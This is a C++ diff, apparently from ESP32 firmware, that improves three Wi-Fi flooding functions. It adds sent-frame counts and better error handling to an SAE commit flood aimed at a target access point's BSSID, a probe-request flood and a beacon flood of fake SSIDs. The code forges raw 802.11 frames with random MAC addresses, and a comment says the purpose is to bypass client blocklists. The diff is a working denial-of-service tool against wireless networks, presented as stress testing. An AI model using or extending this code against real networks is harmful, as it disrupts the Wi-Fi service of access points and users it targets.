@@ -11,8 +11,8 @@
 namespace politician {
 namespace stress {
 
-void saeCommitFlood(const uint8_t* bssid, uint32_t count, uint8_t channel) {
-    if (!bssid || count == 0) return;
+uint32_t saeCommitFlood(const uint8_t* bssid, uint32_t count, uint8_t channel) {
+    if (!bssid || count == 0) return 0;
     if (channel >= 1) {
         esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
     }
@@ -40,6 +40,7 @@ void saeCommitFlood(const uint8_t* bssid, uint32_t count, uint8_t channel) {
     memcpy(&pkt[4], bssid, 6);
     memcpy(&pkt[16], bssid, 6);
 
+    uint32_t sent = 0;
     for (uint32_t i = 0; i < count; i++) {
         // Bruteforce a completely random MAC address to bypass client blocklists!
         for (int m = 0; m < 6; m++) {
@@ -51,15 +52,23 @@ void saeCommitFlood(const uint8_t* bssid, uint32_t count, uint8_t channel) {
         esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
         if (err == ESP_ERR_NO_MEM) {
             vTaskDelay(1);
-            esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
-        } else if ((i & 0x1F) == 0x1F) {
+            err = esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
+        }
+        if (err == ESP_ERR_INVALID_ARG) {
+            break;
+        }
+        if (err == ESP_OK) {
+            sent++;
+        }
+        if ((i & 0x1F) == 0x1F) {
             vTaskDelay(1);
         }
     }
+    return sent;
 }
 
-void probeRequestFlood(uint32_t count, uint8_t channel) {
-    if (count == 0) return;
+uint32_t probeRequestFlood(uint32_t count, uint8_t channel) {
+    if (count == 0) return 0;
     if (channel >= 1) {
         esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
     }
@@ -79,6 +88,7 @@ void probeRequestFlood(uint32_t count, uint8_t channel) {
         0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24
     };
 
+    uint32_t sent = 0;
     for (uint32_t i = 0; i < count; i++) {
         // Rapidly spin up random fake devices demanding network parameters
         for (int m = 0; m < 6; m++) {
@@ -90,22 +100,31 @@ void probeRequestFlood(uint32_t count, uint8_t channel) {
         esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
         if (err == ESP_ERR_NO_MEM) {
             vTaskDelay(1);
-            esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
-        } else if ((i & 0x1F) == 0x1F) {
+            err = esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
+        }
+        if (err == ESP_ERR_INVALID_ARG) {
+            break;
+        }
+        if (err == ESP_OK) {
+            sent++;
+        }
+        if ((i & 0x1F) == 0x1F) {
             vTaskDelay(1);
         }
     }
+    return sent;
 }
 
 
-void beaconFlood(const char **ssids, uint8_t ssidCount,
-                 uint8_t channel, uint32_t durationMs) {
-    if (!ssids || ssidCount == 0 || durationMs == 0) return;
+uint32_t beaconFlood(const char **ssids, uint8_t ssidCount,
+                     uint8_t channel, uint32_t durationMs) {
+    if (!ssids || ssidCount == 0 || durationMs == 0) return 0;
     esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
 
     uint8_t frame[128];
     uint32_t start = millis();
     uint32_t seq = 0;
+    uint32_t sent = 0;
 
     while (millis() - start < durationMs) {
         const char *ssid = ssids[seq % ssidCount];
@@ -138,10 +157,17 @@ void beaconFlood(const char **ssids, uint8_t ssidCount,
         esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, p, false);
         if (err == ESP_ERR_NO_MEM) {
             vTaskDelay(1);
-            esp_wifi_80211_tx(WIFI_IF_AP, frame, p, false);
+            err = esp_wifi_80211_tx(WIFI_IF_AP, frame, p, false);
+        }
+        if (err == ESP_ERR_INVALID_ARG) {
+            break;
+        }
+        if (err == ESP_OK) {
+            sent++;
         }
         vTaskDelay(pdMS_TO_TICKS(5));
     }
+    return sent;
 }
 } // namespace stress
 } // namespace politician
